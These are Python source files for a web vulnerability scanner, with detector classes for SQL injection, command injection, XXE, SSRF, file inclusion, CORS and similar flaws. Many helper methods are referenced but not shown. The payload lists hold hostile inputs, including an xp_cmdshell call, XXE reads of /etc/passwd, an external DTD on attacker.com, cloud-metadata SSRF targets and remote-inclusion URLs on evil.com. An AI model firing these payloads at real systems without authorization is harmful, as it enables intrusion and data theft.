
# vulnerabilities/base.py
from abc import ABC, abstractmethod
from dataclasses import dataclass
from enum import Enum
from typing import List, Dict, Optional
from utils.http_utils import HTTPClient

class Severity(Enum):
    CRITICAL = "Critical"
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"
    INFO = "Informational"

@dataclass
class VulnerabilityResult:
    name: str
    description: str
    severity: Severity
    url: str
    evidence: str
    cwe_id: Optional[str] = None
    cvss_score: Optional[float] = None
    remediation: Optional[str] = None

class VulnerabilityDetector(ABC):
    def __init__(self, http_client: HTTPClient):
        self.http_client = http_client

    @abstractmethod
    def detect(self, url: str) -> List[VulnerabilityResult]:
        pass

# vulnerabilities/injection/sql_injection.py
from ..base import VulnerabilityDetector, VulnerabilityResult, Severity

class SQLInjectionDetector(VulnerabilityDetector):
    def __init__(self, http_client: HTTPClient):
        super().__init__(http_client)
        self.payloads = [
            "' OR '1'='1",
            "1' ORDER BY 1--",
            "1' UNION SELECT NULL--",
            "1' WAITFOR DELAY '0:0:5'--",
            "')) OR SQLi=1 OR (('1'='1",
            "1'; EXEC xp_cmdshell('net user');--",
        ]
        self.error_patterns = [
            "sql syntax",
            "mysql_fetch",
            "ORA-",
            "SQLServer",
            "PostgreSQL.*ERROR",
            "sqlite3.OperationalError",
        ]

    def detect(self, url: str) -> List[VulnerabilityResult]:
        results = []
        for payload in self.payloads:
            response = self._test_payload(url, payload)
            if self._is_vulnerable(response):
                results.append(
                    VulnerabilityResult(
                        name="SQL Injection",
                        description=f"SQL injection vulnerability found with payload: {payload}",
                        severity=Severity.CRITICAL,
                        url=url,
                        evidence=f"Response contains SQL error patterns",
                        cwe_id="CWE-89",
                        cvss_score=9.8,
                        remediation="Use parameterized queries and input validation"
                    )
                )
        return results

# vulnerabilities/injection/command_injection.py
class CommandInjectionDetector(VulnerabilityDetector):
    def __init__(self, http_client: HTTPClient):
        super().__init__(http_client)
        self.payloads = [
            "; sleep 5 #",
            "| sleep 5 #",
            "` sleep 5 `",
            "$(sleep 5)",
            "&& sleep 5 &&",
            "; ping -c 3 localhost ;",
        ]

    def detect(self, url: str) -> List[VulnerabilityResult]:
        results = []
        for payload in self.payloads:
            if self._test_timing_attack(url, payload):
                results.append(
                    VulnerabilityResult(
                        name="Command Injection",
                        description="OS Command injection vulnerability detected",
                        severity=Severity.CRITICAL,
                        url=url,
                        evidence=f"Time-based detection with payload: {payload}",
                        cwe_id="CWE-78",
                        cvss_score=9.8,
                        remediation="Avoid shell commands, use APIs or libraries"
                    )
                )
        return results

# vulnerabilities/authentication/auth_bypass.py
class AuthBypassDetector(VulnerabilityDetector):
    def __init__(self, http_client: HTTPClient):
        super().__init__(http_client)
        self.checks = [
            self._check_default_credentials,
            self._check_auth_bypass,
            self._check_broken_auth,
            self._check_password_reset
        ]

    def detect(self, url: str) -> List[VulnerabilityResult]:
        results = []
        for check in self.checks:
            results.extend(check(url))
        return results

    def _check_password_reset(self, url: str) -> List[VulnerabilityResult]:
        # Test for password reset vulnerabilities
        pass

# vulnerabilities/xxe/xxe_injection.py
class XXEInjectionDetector(VulnerabilityDetector):
    def __init__(self, http_client: HTTPClient):
        super().__init__(http_client)
        self.payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///proc/self/environ">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><data>&exploit;</data>'
        ]

    def detect(self, url: str) -> List[VulnerabilityResult]:
        results = []
        for payload in self.payloads:
            if self._test_xxe(url, payload):
                results.append(
                    VulnerabilityResult(
                        name="XXE Injection",
                        description="XML External Entity injection vulnerability",
                        severity=Severity.CRITICAL,
                        url=url,
                        evidence="Server processed external entity",
                        cwe_id="CWE-611",
                        cvss_score=9.1,
                        remediation="Disable external entity processing"
                    )
                )
        return results

# vulnerabilities/csrf/csrf_detector.py
class CSRFDetector(VulnerabilityDetector):
    def detect(self, url: str) -> List[VulnerabilityResult]:
        results = []
        response = self.http_client.get(url)
        if response:
            if not self._has_csrf_protection(response):
                results.append(
                    VulnerabilityResult(
                        name="CSRF Vulnerability",
                        description="No CSRF token found in form",
                        severity=Severity.HIGH,
                        url=url,
                        evidence="Missing CSRF protection mechanisms",
                        cwe_id="CWE-352",
                        cvss_score=8.0,
                        remediation="Implement CSRF tokens in all forms"
                    )
                )
        return results

# vulnerabilities/ssrf/ssrf_detector.py
class SSRFDetector(VulnerabilityDetector):
    def __init__(self, http_client: HTTPClient):
        super().__init__(http_client)
        self.test_endpoints = [
            "http://169.254.169.254/",  # AWS metadata
            "http://127.0.0.1:22",      # SSH
            "http://localhost:3306",     # MySQL
            "file:///etc/passwd",        # Local file
        ]

    def detect(self, url: str) -> List[VulnerabilityResult]:
        results = []
        for endpoint in self.test_endpoints:
            if self._test_ssrf(url, endpoint):
                results.append(
                    VulnerabilityResult(
                        name="Server-Side Request Forgery",
                        description=f"SSRF vulnerability detected with {endpoint}",
                        severity=Severity.HIGH,
                        url=url,
                        evidence=f"Server made request to {endpoint}",
                        cwe_id="CWE-918",
                        cvss_score=8.6,
                        remediation="Validate and sanitize all URLs"
                    )
                )
        return results

# vulnerabilities/deserialization/insecure_deserialization.py
class DeserializationDetector(VulnerabilityDetector):
    def detect(self, url: str) -> List[VulnerabilityResult]:
        payloads = self._generate_payloads()
        results = []
        
        for payload in payloads:
            if self._test_deserialization(url, payload):
                results.append(
                    VulnerabilityResult(
                        name="Insecure Deserialization",
                        description="Application vulnerable to deserialization attacks",
                        severity=Severity.HIGH,
                        url=url,
                        evidence="Unsafe deserialization of user input",
                        cwe_id="CWE-502",
                        cvss_score=8.1,
                        remediation="Use safe serialization formats and validate input"
                    )
                )
        return results

# vulnerabilities/file/file_inclusion.py
class FileInclusionDetector(VulnerabilityDetector):
    def __init__(self, http_client: HTTPClient):
        super().__init__(http_client)
        self.lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php",
        ]
        self.rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/malicious",
            "ftp://attacker.com/exec.php",
        ]

    def detect(self, url: str) -> List[VulnerabilityResult]:
        results = []
        results.extend(self._check_lfi(url))
        results.extend(self._check_rfi(url))
        return results

# vulnerabilities/business_logic/business_logic.py
class BusinessLogicDetector(VulnerabilityDetector):
    def detect(self, url: str) -> List[VulnerabilityResult]:
        checks = [
            self._check_price_manipulation,
            self._check_race_conditions,
            self._check_parameter_tampering,
            self._check_workflow_bypass
        ]
        
        results = []
        for check in checks:
            results.extend(check(url))
        return results

# vulnerabilities/cors/cors_detector.py
class CORSDetector(VulnerabilityDetector):
    def detect(self, url: str) -> List[VulnerabilityResult]:
        results = []
        response = self.http_client.get(url)
        
        if response:
            headers = response.headers
            if self._has_cors_misconfiguration(headers):
                results.append(
                    VulnerabilityResult(
                        name="CORS Misconfiguration",
                        description="Insecure CORS configuration detected",
                        severity=Severity.HIGH,
                        url=url,
                        evidence=str(headers.get('Access-Control-Allow-Origin')),
                        cwe_id="CWE-942",
                        cvss_score=8.0,
                        remediation="Configure strict CORS policies"
                    )
                )
        return results
